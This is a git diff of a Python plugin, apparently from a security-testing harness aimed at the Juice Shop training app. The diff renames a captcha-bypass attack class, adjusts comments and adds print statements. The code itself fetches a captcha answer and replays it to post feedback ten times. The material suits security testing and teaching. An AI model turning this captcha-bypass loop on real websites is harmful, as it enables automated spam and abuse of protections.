@@ -13,22 +13,22 @@ import time
 from plugins import attack as a
 
 #---------------------------------------------------------------------------------------
-#Class: test_captcha_bypass
+#Class: captcha_bypass
 #Inherit: Attack
-#-----------------------------------------------------------------------------------------------
-class test_captcha_bypass(a.attack_inter):
+#--------------------------------------------------------------------------------------
+class captcha_bypass(a.attack_inter):
 #-----------------------------------------
 #FUNCTION: __init__ 
 #ARGUMENTS: N/A
 #RETURNS: void
 #Description: Initial class variables(REST session; getUrl; postUrl).
-#-----------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
     def __init__(self):
         self.juice_session = a.requests.session()
         self.getUrl = a.URL + '/rest/captcha/'
         self.postUrl = a.URL + '/api/Feedbacks/'
 
-#-----------------------------------------
+#--------------------------------------------------------------------------------------
 #FUNCTION generator
 #ARGUMENTS: myScript --> (answer, captchaId) pair to pass math question verification
 #RETURNS: data  --> will be embedded into POST request json field. 
@@ -36,7 +36,7 @@ class test_captcha_bypass(a.attack_inter):
 #             
 #NOTES:
 # ALL REST requests needed data like json_data, header, and cookie must generated through this function
-#-----------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
     def generator(self, myScript):
         data = {
             'captcha': myScript[0],
@@ -46,7 +46,7 @@ class test_captcha_bypass(a.attack_inter):
         }
         return data
 
-#-----------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
 #FUNCTION run
 #ARGUMENTS: N/A
 #RETURNS: N/A
@@ -56,8 +56,9 @@ class test_captcha_bypass(a.attack_inter):
 #             3. Loop to send crafted POST requests 10 times. 
 #             
 #NOTES: None
-#-----------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
     def run(self):
+        print("================Start captcha bypass==============")
         a.logging.basicConfig(filename='./test_logging_info.log', 
                             level=a.logging.INFO, format='%(asctime)s %(message)s')
         a.logging.Formatter.converter = time.gmtime
@@ -72,3 +73,4 @@ class test_captcha_bypass(a.attack_inter):
             mydata = self.generator(token)
             response = self.juice_session.post(self.postUrl, data=mydata)
         a.logging.info('Finished')
+        print("================captcha bypass END==============")
